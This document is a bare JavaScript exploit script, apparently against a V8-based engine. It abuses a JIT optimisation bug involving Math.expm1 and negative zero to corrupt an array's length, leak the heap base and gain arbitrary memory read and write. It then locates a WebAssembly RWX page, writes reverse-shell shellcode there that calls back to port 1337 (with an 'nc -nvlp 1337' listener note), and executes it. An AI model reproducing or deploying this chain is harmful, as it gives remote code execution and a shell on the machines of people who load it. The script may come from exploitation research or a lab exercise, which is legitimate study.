var buf = new ArrayBuffer(0x200);
var uIntArray = new Uint32Array(buf);
var floatArray = new Float64Array(buf);

function ftoi(doubleNum)
{
    floatArray[0] = doubleNum;
    intNum = BigInt(uIntArray[0]) + (BigInt(uIntArray[1]) << 32n);
    return intNum
}

function itof(intNum)
{
    uIntArray[0] = Number(intNum & 0xffffffffn);
    uIntArray[1] = Number(intNum >> 32n);
    return floatArray[0];
}

var arrayOfDoubles = [1.1, 1.2, 1.3, 1.4];
var arrayOfUint = new Uint32Array(10);
var b = new ArrayBuffer(10);
var arrayOfDoubles2 = [1.1, 1.2, 1.3];

function foo(a, x) {
    	let o = {mz: -0};
    	let b = Object.is(Math.expm1(x), o.mz);
	// Trying to increase the size of arrayOfUint
	d = 0x0000010000000000n;
	a[b * 0x18] = itof(d);
}

for(let i = 0; i < 10000; i++)
    foo(arrayOfDoubles, "0");
foo(arrayOfDoubles, -0);
console.log(arrayOfUint[0]);

heap_base = (BigInt(arrayOfUint[0x16]) << 32n) | BigInt(arrayOfUint[0x15])
heap_base = heap_base - 0x7n;
console.log("Heap base @ ", heap_base.toString(16));

var dataview = new DataView(b);

function change_backing_store(a, addr)
{
	a[0x23] = Number(addr & 0xffffffffn);
	a[0x24] = Number(addr >> 32n);
}

function arb_read(a, addr)
{
	change_backing_store(a, addr)
	leak = dataview.getBigUint64()
	b0 = leak & 0xffn;
	leak >>= 8n;
	b1 = leak & 0xffn;
	leak >>= 8n;
	b2 = leak & 0xffn;
	leak >>= 8n;
	b3 = leak & 0xffn;
	leak >>= 8n;
	b4 = leak & 0xffn;
	leak >>= 8n;
	b5 = leak & 0xffn;
	leak >>= 8n;
	b6 = leak & 0xffn;
	leak >>= 8n;
	b7 = leak & 0xffn;
	leak = BigInt(0);
	leak |= b0;
	leak <<= 8n;
	leak |= b1;
	leak <<= 8n;
	leak |= b2;
	leak <<= 8n;
	leak |= b3;
	leak <<= 8n;
	leak |= b4;
	leak <<= 8n;
	leak |= b5;
	leak <<= 8n;
	leak |= b6;
	leak <<= 8n;
	leak |= b7;
	return leak
}


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var i = 0x1d3554n/8n;
var j = 0;
var ptr = 0n;
var half = 0;
while (1)
{
	leak = arb_read(arrayOfUint, heap_base+i*8n);
	if (leak == 0x6f6d656d00000006n)
	{
		ptr = heap_base+i*8n;
		console.log("Found it at " + ptr.toString(16));
		break;
	}

	if ((leak & 0xffffffffn) == 0x6f6d656dn)
	{
		ptr = heap_base+i*8n;
		half = 1;
		console.log("Found it at " + ptr.toString(16));
		break;
	}
	if (j == 0x100)
		break;
	console.log((heap_base+i*8n).toString(16) +" : " + leak.toString(16));
	i++;
	j++;
}

console.log("Leak is " + leak.toString(16))

if (half == 1)
{
	rwx_page = ((arb_read(arrayOfUint, ptr + 0x10n) & 0xffffffffn) << 32n) | (arb_read(arrayOfUint, ptr + 0x8n) >> 32n);
} else {
	rwx_page = arb_read(arrayOfUint, ptr + 0x10n);
}
console.log("RWX is at " + rwx_page.toString(16));
function arb_write(a, addr, offset, val)
{
        change_backing_store(a, addr)
        dataview.setUint32(offset, val)
}

// This shellcode will connect back to your current machine at port 1337.
// To test this you should run : nc -nvlp 1337

shellcode = [1781094506, 39807489, 1587089157, 1216988488, 3087073537, 16843009, 38815928, 50398264, 2113995011, 1211171876, 1781160008, 2314168848, 1514703334, 252004489, 4013028970, 559419141, 1216999274, 22964769, 1477379400, 2314168834, 1584013656, 252013160, 1220030306, 1768828719, 796086344, 2313644146, 1761673601, 874774785, 16855542, 1449789534, 1208084054, 1216996913, 3530177368, 252013160]

for(var i = 0n; i < shellcode.length; i++)
	arb_write(arrayOfUint, rwx_page+i*4n, 0, shellcode[i]);
f();
